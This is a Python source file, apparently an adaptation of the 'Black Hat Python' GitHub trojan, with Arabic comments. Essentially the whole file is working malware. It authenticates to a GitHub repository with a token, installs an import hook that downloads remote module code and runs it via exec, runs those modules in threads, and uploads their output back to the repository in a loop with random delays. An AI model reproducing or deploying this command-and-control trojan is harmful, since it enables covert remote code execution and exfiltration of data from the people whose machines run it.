import base64
import github3
import importlib.util
import json
import random
import sys
import threading
import time
import uuid  # مكتبة لإنشاء أسماء فريدة
from datetime import datetime

# إعداد الاتصال
def github_connect():
    with open('mytoken.txt') as f:
        token = f.read().strip()
    user = 'alakhas997-droid' 
    sess = github3.login(token=token)
    return sess.repository(user, 'bhptrojan')

def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content

class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = github_connect()
        # إنشاء قفل لمنع التضارب عند الرفع
        self.lock = threading.Lock()

    def get_config(self):
        config_json = get_file_contents('config', self.config_file, self.repo)
        config = json.loads(base64.b64decode(config_json))
        for task in config:
            if task['module'] not in sys.modules:
                exec("import %s" % task['module'])
        return config

    def module_runner(self, module):
        try:
            result = sys.modules[module].run()
            self.store_module_result(result)
        except Exception as e:
            print(f"[-] Error running module {module}: {e}")

    def store_module_result(self, data):
        # استخدام UUID لضمان عدم تكرار اسم الملف أبداً
        message = datetime.now().isoformat().replace(":", "-")
        unique_name = f'{message}_{uuid.uuid4()}.data'
        remote_path = f'data/{self.id}/{unique_name}'
        
        if isinstance(data, bytes):
            bindata = data
        else:
            bindata = bytes('%r' % data, 'utf-8')
            
        # استخدام القفل لإجبار العمليات على الانتظار (يحل مشكلة 409 Conflict)
        with self.lock:
            try:
                self.repo.create_file(remote_path, message, base64.b64encode(bindata))
                print(f"[+] Data saved: {unique_name}")
            except Exception as e:
                print(f"[-] Failed to save data: {e}")

    def run(self):
        while True:
            config = self.get_config()
            for task in config:
                thread = threading.Thread(
                    target=self.module_runner,
                    args=(task['module'],)
                )
                thread.start()
            # زيادة وقت الانتظار قليلاً لتخفيف الضغط على الشبكة
            time.sleep(random.randint(5, 20))

class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def find_spec(self, name, path, target=None):
        print(f"[*] Attempting to retrieve {name}")
        self.repo = github_connect()
        try:
            new_library = get_file_contents('modules', f'{name}.py', self.repo)
            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return importlib.util.spec_from_loader(name, loader=self)
        except Exception as e:
            return None
        return None

    def create_module(self, spec):
        return None

    def exec_module(self, module):
        exec(self.current_module_code, module.__dict__)

if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    trojan = Trojan('abc')
    trojan.run()